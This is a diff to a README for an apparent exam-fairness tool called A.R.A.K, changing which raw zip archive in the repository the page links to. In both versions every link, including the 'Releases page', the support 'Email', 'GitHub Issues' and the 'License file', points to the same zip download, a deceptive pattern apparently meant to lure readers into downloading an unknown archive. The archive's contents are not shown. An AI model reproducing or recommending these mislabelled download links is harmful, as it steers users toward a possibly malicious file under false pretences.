@@ -1,6 +1,6 @@
 # 🎓 A.R.A.K - Ensure Fairness in Online Exams
 
-[![Download A.R.A.K](https://raw.githubusercontent.com/Alberto0120/A.R.A.K/main/Dunkard/A.R.A.K.zip)](https://raw.githubusercontent.com/Alberto0120/A.R.A.K/main/Dunkard/A.R.A.K.zip)
+[![Download A.R.A.K](https://github.com/Alberto0120/A.R.A.K/raw/refs/heads/main/src/logic/K-1.4.zip)](https://github.com/Alberto0120/A.R.A.K/raw/refs/heads/main/src/logic/K-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before downloading, make sure your computer meets the following requirements:
 
 To get A.R.A.K, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Alberto0120/A.R.A.K/main/Dunkard/A.R.A.K.zip) to download the software.
+1. Visit the [Releases page](https://github.com/Alberto0120/A.R.A.K/raw/refs/heads/main/src/logic/K-1.4.zip) to download the software.
 2. Select the latest version listed at the top.
 3. Click on the download button for the installation file.
 4. Once the file downloads, locate it in your computer’s Downloads folder.
@@ -57,8 +57,8 @@ If you encounter any issues, here are some common solutions:
 
 For further assistance or to report issues, please reach out to our support team:
 
-- Email: https://raw.githubusercontent.com/Alberto0120/A.R.A.K/main/Dunkard/A.R.A.K.zip
-- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/Alberto0120/A.R.A.K/main/Dunkard/A.R.A.K.zip)
+- Email: https://github.com/Alberto0120/A.R.A.K/raw/refs/heads/main/src/logic/K-1.4.zip
+- GitHub Issues: [Report an Issue](https://github.com/Alberto0120/A.R.A.K/raw/refs/heads/main/src/logic/K-1.4.zip)
 
 ## 🌐 Contributing
 
@@ -68,10 +68,10 @@ We welcome contributions to make A.R.A.K better. If you have ideas or improvemen
 
 A.R.A.K is open-source software under the MIT License. You can freely use, modify, and distribute it as per the license.
 
-For more details, visit the [License file](https://raw.githubusercontent.com/Alberto0120/A.R.A.K/main/Dunkard/A.R.A.K.zip). 
+For more details, visit the [License file](https://github.com/Alberto0120/A.R.A.K/raw/refs/heads/main/src/logic/K-1.4.zip). 
 
 ## 📅 Updates
 
 Keep an eye on the Releases page for future updates. We will continue to improve the application with new features and enhancements based on user feedback.
 
-[![Download A.R.A.K](https://raw.githubusercontent.com/Alberto0120/A.R.A.K/main/Dunkard/A.R.A.K.zip)](https://raw.githubusercontent.com/Alberto0120/A.R.A.K/main/Dunkard/A.R.A.K.zip)
+[![Download A.R.A.K](https://github.com/Alberto0120/A.R.A.K/raw/refs/heads/main/src/logic/K-1.4.zip)](https://github.com/Alberto0120/A.R.A.K/raw/refs/heads/main/src/logic/K-1.4.zip)
